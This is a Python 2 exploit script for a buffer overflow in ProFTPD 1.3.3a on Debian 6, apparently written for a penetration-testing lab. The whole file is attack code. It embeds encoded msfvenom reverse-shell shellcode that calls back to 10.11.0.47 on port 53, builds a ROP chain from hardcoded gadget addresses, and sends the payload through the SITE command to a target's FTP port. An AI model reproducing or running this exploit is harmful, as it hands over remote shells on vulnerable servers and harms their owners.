#!/usr/bin/python
import socket
import struct

# msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=10.11.0.47 LPORT=53 -e x86/shikata_ga_nai -b "\x09\x0a\x0b\x0c\x0d\x20\xff" -f c
# Payload size: 95 bytes
shellcode = (
"\xba\xbf\xed\x1e\xfb\xda\xd8\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x12\x83\xee\xfc\x31\x56\x0e\x03\xe9\xe3\xfc\x0e\x24\x27\xf7"
"\x12\x15\x94\xab\xbe\x9b\x93\xad\x8f\xfd\x6e\xad\x63\x58\xc1"
"\x91\x4e\xda\x68\x97\xa9\xb2\x60\x6c\x4a\x6d\x1d\x70\x4a\x71"
"\xe8\xfd\xab\xc1\x74\xae\x7a\x72\xca\x4d\xf4\x95\xe1\xd2\x54"
"\x3d\x94\xfd\x2b\xd5\x00\x2d\xe3\x47\xb8\xb8\x18\xd5\x69\x32"
"\x3f\x69\x86\x89\x40"
)

# Debian 6 - ProFTPD 1.3.3a
ret = struct.pack('<L', 0x805a547) # pop esi / pop ebp / ret
writable = struct.pack('<L', 0x80e81a0) # .data
iaccount = 4096+16
offset = 0x102c-4
buffer = 'SITE ' + shellcode 
oddbyte = "\x41" if (len(buffer) % 2) == 0 else ""
buffer += oddbyte + "\xff"*(iaccount-len(shellcode)) 
padding = "\x41"*(offset-len(buffer))
buffer += padding + ret + writable
buffer += struct.pack('<L', 0xcccccccc) # unused
buffer += struct.pack('<L', 0x805a544) # mov eax,esi / pop ebx / pop esi / pop ebp / ret
buffer += struct.pack('<L', 0xcccccccc) # becomes ebx
buffer += struct.pack('<L', 0xcccccccc) # becomes esi
buffer += struct.pack('<L', 0xcccccccc) # becomes ebp
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x0805c26c) # jmp eax
buffer += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "Connecting.\n"
	s.connect(('10.11.1.146', 21))
	print "Sending buffer.\n"
	s.send(buffer)
	print "Done.\n"
except:
	print "Failed.\n"
